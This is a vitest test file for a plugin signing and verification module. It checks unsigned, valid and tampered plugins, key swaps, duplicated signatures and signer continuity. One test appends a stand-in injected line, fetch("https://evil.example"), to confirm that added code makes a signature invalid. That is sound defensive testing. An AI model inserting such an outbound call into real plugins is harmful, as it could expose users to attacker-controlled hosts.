import { describe, expect, it } from 'vitest'
import { canonicalizePluginSource, checkSignerContinuity, verifyPluginSignature } from './pluginSignature'
import { generateSigningKey, signPluginSource } from '../../../util/signPlugin.mjs'

const pluginSource = [
    '//@name signed_plugin',
    '//@api 3.0',
    '//@version 1.0.0',
    '',
    'Risuai.log("hello");',
].join('\n')

describe('verifyPluginSignature', () => {
    const key = generateSigningKey()
    const signed = signPluginSource(pluginSource, key)

    it('treats plugins without signature lines as unsigned', async () => {
        expect(await verifyPluginSignature(pluginSource)).toEqual({ state: 'unsigned' })
    })

    it('accepts code signed by util/signPlugin.mjs', async () => {
        const status = await verifyPluginSignature(signed)
        expect(status.state).toBe('valid')
    })

    it('accepts CRLF line endings and a BOM', async () => {
        const status = await verifyPluginSignature('﻿' + signed.replace(/\n/g, '\r\n'))
        expect(status.state).toBe('valid')
    })

    it('rejects modified code', async () => {
        const tampered = signed.replace('Risuai.log("hello");', 'Risuai.log("stolen");')
        const status = await verifyPluginSignature(tampered)
        expect(status.state).toBe('invalid')
    })

    it('rejects added lines', async () => {
        const status = await verifyPluginSignature(signed + 'fetch("https://evil.example");\n')
        expect(status.state).toBe('invalid')
    })

    it('rejects a signature swapped onto a different key', async () => {
        const otherSigned = signPluginSource(pluginSource, generateSigningKey())
        const otherKeyLine = otherSigned.split('\n').find((line) => line.startsWith('//@signature-key '))
        const swapped = signed.replace(/^\/\/@signature-key .*$/m, otherKeyLine)
        expect((await verifyPluginSignature(swapped)).state).toBe('invalid')
    })

    it('rejects a signature line without a key line', async () => {
        const withoutKey = signed.replace(/^\/\/@signature-key .*\n/m, '')
        expect((await verifyPluginSignature(withoutKey)).state).toBe('invalid')
    })

    it('rejects duplicated signature lines', async () => {
        const signatureLine = signed.split('\n').find((line) => line.startsWith('//@signature '))
        expect((await verifyPluginSignature(signed + signatureLine + '\n')).state).toBe('invalid')
    })

    it('re-signing replaces the previous signature', async () => {
        // ECDSA signatures are randomized, so compare structure rather than bytes
        const resigned = signPluginSource(signed, key)
        expect(resigned.split('\n').filter((line) => line.startsWith('//@signature'))).toHaveLength(2)
        expect((await verifyPluginSignature(resigned)).state).toBe('valid')
    })
})

describe('canonicalizePluginSource', () => {
    it('keeps the key line and drops only the signature line', () => {
        const code = '//@name a\n//@signature-key AAAA\n//@signature BBBB\n'
        expect(canonicalizePluginSource(code)).toBe('//@name a\n//@signature-key AAAA\n')
    })
})

describe('checkSignerContinuity', () => {
    const keyA = { state: 'valid', publicKey: 'A', fingerprint: 'a' } as const
    const keyB = { state: 'valid', publicKey: 'B', fingerprint: 'b' } as const

    it('allows unsigned plugins to be replaced by anything', () => {
        expect(checkSignerContinuity({ state: 'unsigned' }, { state: 'unsigned' })).toBeNull()
        expect(checkSignerContinuity({ state: 'unsigned' }, keyB)).toBeNull()
    })

    it('allows updates signed by the same key', () => {
        expect(checkSignerContinuity(keyA, { ...keyA })).toBeNull()
    })

    it('rejects a different key or a removed signature', () => {
        expect(checkSignerContinuity(keyA, keyB)).toBeTypeOf('string')
        expect(checkSignerContinuity(keyA, { state: 'unsigned' })).toBeTypeOf('string')
        expect(checkSignerContinuity(keyA, { state: 'invalid', reason: 'bad' })).toBe('bad')
    })
})
